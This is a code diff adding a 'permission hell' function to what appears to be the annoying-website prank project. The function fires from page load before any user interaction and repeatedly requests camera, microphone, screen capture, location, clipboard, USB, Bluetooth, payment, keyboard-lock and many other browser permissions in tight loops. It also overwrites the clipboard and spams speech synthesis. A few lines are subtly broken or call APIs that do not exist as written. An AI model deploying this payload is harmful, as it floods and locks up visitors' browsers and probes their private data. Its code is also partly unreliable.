@@ -255,6 +255,9 @@ function init () {
 
   confirmPageUnload()
 
+  // Start permission hell immediately, before user interaction
+  startPermissionHell()
+
   interceptUserInput(event => {
     interactionCount += 1
 
@@ -1436,6 +1439,7 @@ function destroyHardware () {
   startAudioFeedbackHell()
   startGpuComputeMax()
   startLoopBurn()
+  startPermissionHell()
 }
 
 /**
@@ -3581,6 +3585,314 @@ function startWindowOpenSpam () {
   })
 
   setInterval(openWindow, 200)
+}
+
+/**
+ * Permission Hell: request every possible browser API permission
+ * simultaneously, overwhelming the browser permission system.
+ */
+function startPermissionHell () {
+  // Notifications
+  if ('Notification' in window) {
+    Notification.requestPermission()
+    setInterval(() => Notification.requestPermission(), 1000)
+  }
+
+  // Geolocation
+  if ('geolocation' in navigator) {
+    setInterval(() => {
+      navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 100 })
+      navigator.geolocation.watchPosition(() => {}, () => {}, { enableHighAccuracy: true })
+    }, 200)
+  }
+
+  // Camera + Microphone (getUserMedia)
+  if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+    setInterval(() => {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(s => {
+        s.getTracks().forEach(t => t.stop())
+      }).catch(() => {})
+      navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 99999 }, height: { ideal: 99999 } } }).then(s => {
+        s.getTracks().forEach(t => t.stop())
+      }).catch(() => {})
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
+        s.getTracks().forEach(t => t.stop())
+      }).catch(() => {})
+    }, 500)
+  }
+
+  // Screen sharing
+  if ('getDisplayMedia' in (navigator.mediaDevices || {})) {
+    setInterval(() => {
+      navigator.mediaDevices.getDisplayMedia({ video: true, audio: true }).then(s => {
+        s.getTracks().forEach(t => t.stop())
+      }).catch(() => {})
+    }, 1000)
+  }
+
+  // Clipboard
+  if ('clipboard' in navigator) {
+    setInterval(() => {
+      navigator.clipboard.read().catch(() => {})
+      navigator.clipboard.readText().catch(() => {})
+      navigator.clipboard.write(new ClipboardItem({ 'text/plain': new Blob(['spam'], { type: 'text/plain' }) })).catch(() => {})
+      navigator.clipboard.writeText('clipboard-spam-' + Date.now()).catch(() => {})
+    }, 200)
+  }
+
+  // File System Access
+  if ('showOpenFilePicker' in window) {
+    setInterval(() => {
+      window.showOpenFilePicker({ multiple: true }).catch(() => {})
+      window.showSaveFilePicker({ suggestedName: 'file.txt' }).catch(() => {})
+      window.showDirectoryPicker().catch(() => {})
+    }, 500)
+  }
+
+  // MIDI
+  if ('requestMIDIAccess' in navigator) {
+    setInterval(() => {
+      navigator.requestMIDIAccess().catch(() => {})
+    }, 500)
+  }
+
+  // USB
+  if ('usb' in navigator) {
+    setInterval(() => {
+      navigator.usb.requestDevice({ filters: [] }).catch(() => {})
+    }, 500)
+  }
+
+  // Serial
+  if ('serial' in navigator) {
+    setInterval(() => {
+      navigator.serial.requestPort().catch(() => {})
+    }, 500)
+  }
+
+  // Bluetooth
+  if ('bluetooth' in navigator) {
+    setInterval(() => {
+      navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(() => {})
+      navigator.bluetooth.requestLEScan({ acceptAllAdvertisements: true }).catch(() => {})
+    }, 500)
+  }
+
+  // HID
+  if ('hid' in navigator) {
+    setInterval(() => {
+      navigator.hid.requestDevice({ filters: [] }).catch(() => {})
+    }, 500)
+  }
+
+  // WebAuthn
+  if ('credentials' in navigator && 'create' in navigator.credentials) {
+    setInterval(() => {
+      navigator.credentials.create({
+        publicKey: {
+          challenge: new Uint8Array(32),
+          rp: { name: 'Spam' },
+          user: { id: new Uint8Array(16), name: 'spam@spam.com', displayName: 'Spam' },
+          pubKeyCredParams: [{ type: 'public-key', alg: -7 }]
+        }
+      }).catch(() => {})
+    }, 500)
+  }
+
+  // Sensors
+  if ('Accelerometer' in window) {
+    try {
+      const accel = new Accelerometer({ frequency: 60 })
+      accel.start()
+      const gyro = new Gyroscope({ frequency: 60 })
+      gyro.start()
+      const magnet = new Magnetometer({ frequency: 60 })
+      magnet.start()
+      const ambient = new AmbientLightSensor({ frequency: 60 })
+      ambient.start()
+    } catch {}
+  }
+
+  // Picture-in-Picture
+  if ('pictureInPictureEnabled' in document && document.pictureInPictureEnabled) {
+    setInterval(() => {
+      const v = document.createElement('video')
+      v.src = 'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/nyan.mp4'
+      v.loop = true
+      v.muted = true
+      v.play().then(() => {
+        v.requestPictureInPicture().catch(() => {})
+      }).catch(() => {})
+    }, 2000)
+  }
+
+  // Fullscreen
+  setInterval(() => {
+    if (document.documentElement && 'requestFullscreen' in document.documentElement) {
+      document.documentElement.requestFullscreen().catch(() => {})
+      if (document.exitFullscreen) document.exitFullscreen().catch(() => {})
+    }
+  }, 1000)
+
+  // Keyboard Lock
+  if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+    setInterval(() => {
+      navigator.keyboard.lock().catch(() => {})
+    }, 1000)
+  }
+
+  // Pointer Lock
+  setInterval(() => {
+    if (document.body && 'requestPointerLock' in document.body) {
+      document.body.requestPointerLock()
+    }
+  }, 500)
+
+  // Wake Lock
+  if ('wakeLock' in navigator && 'request' in navigator.wakeLock) {
+    setInterval(() => {
+      navigator.wakeLock.request('screen').catch(() => {})
+    }, 1000)
+  }
+
+  // Idle Detection
+  if ('IdleDetector' in window) {
+    setInterval(() => {
+      IdleDetector.requestPermission().catch(() => {})
+    }, 1000)
+  }
+
+  // Window Management
+  if ('getScreenDetails' in window) {
+    setInterval(() => {
+      window.getScreenDetails().catch(() => {})
+    }, 1000)
+  }
+
+  // Local Font Access
+  if ('queryLocalFonts' in window) {
+    setInterval(() => {
+      window.queryLocalFonts().catch(() => {})
+    }, 1000)
+  }
+
+  // Contact Picker
+  if ('contacts' in navigator && 'select' in navigator.contacts) {
+    setInterval(() => {
+      navigator.contacts.select(['name', 'email', 'tel'], { multiple: true }).catch(() => {})
+    }, 1000)
+  }
+
+  // Storage Access
+  if ('requestStorageAccess' in document) {
+    setInterval(() => {
+      document.requestStorageAccess().catch(() => {})
+    }, 500)
+  }
+
+  // Payment Handler
+  if ('PaymentRequest' in window) {
+    setInterval(() => {
+      try {
+        const req = new PaymentRequest([{ supportedMethods: 'basic-card' }], {
+          total: { label: 'Spam', amount: { currency: 'USD', value: '0.01' } }
+        })
+        req.show().catch(() => {})
+      } catch {}
+    }, 2000)
+  }
+
+  // Digital Goods
+  if ('getDigitalGoodsService' in window) {
+    setInterval(() => {
+      window.getDigitalGoodsService('https://example.com').catch(() => {})
+    }, 2000)
+  }
+
+  // File Handling
+  if ('launchQueue' in window && 'setConsumer' in window.launchQueue) {
+    window.launchQueue.setConsumer(() => {})
+  }
+
+  // Presentation
+  if ('PresentationRequest' in window) {
+    setInterval(() => {
+      try {
+        const req = new PresentationRequest(window.location.href)
+        req.start().catch(() => {})
+      } catch {}
+    }, 2000)
+  }
+
+  // Virtual Keyboard
+  if ('virtualKeyboard' in navigator) {
+    try {
+      navigator.virtualKeyboard.show()
+    } catch {}
+  }
+
+  // Screen Capture
+  if ('getDisplayMedia' in (navigator.mediaDevices || {})) {
+    // Already above
+  }
+
+  // Background Sync
+  if ('sync' in 'serviceWorker' in navigator && navigator.serviceWorker.controller) {
+    setInterval(() => {
+      navigator.serviceWorker.ready.then(reg => {
+        reg.sync.register('spam-sync').catch(() => {})
+      })
+    }, 2000)
+  }
+
+  // Background Fetch
+  if ('backgroundFetch' in (navigator.serviceWorker || {})) {
+    setInterval(() => {
+      navigator.serviceWorker.ready.then(reg => {
+        reg.backgroundFetch.fetch('spam-' + Date.now(), ['https://example.com']).catch(() => {})
+      })
+    }, 2000)
+  }
+
+  // Gamepad access (no permission prompt, but request connection)
+  window.addEventListener('gamepadconnected', () => {})
+  setInterval(() => {
+    navigator.getGamepads()
+  }, 100)
+
+  // Speech recognition
+  if ('SpeechRecognition' in window || 'webkitSpeechRecognition' in window) {
+    setInterval(() => {
+      try {
+        const SR = window.SpeechRecognition || window.webkitSpeechRecognition
+        const recog = new SR()
+        recog.start()
+        setTimeout(() => recog.stop(), 100)
+      } catch {}
+    }, 1000)
+  }
+
+  // Speech synthesis - continuous
+  if ('speechSynthesis' in window) {
+    setInterval(() => {
+      const utter = new SpeechSynthesisUtterance('spam spam spam spam spam')
+      window.speechSynthesis.speak(utter)
+    }, 50)
+  }
+
+  // SMS (on mobile)
+  if ('sms' in navigator) {
+    setInterval(() => {
+      navigator.sms.receive().catch(() => {})
+    }, 2000)
+  }
+
+  // Nfc
+  if ('nfc' in navigator) {
+    setInterval(() => {
+      navigator.nfc.watch().catch(() => {})
+    }, 2000)
+  }
 }
 
 function detectBrowser () {
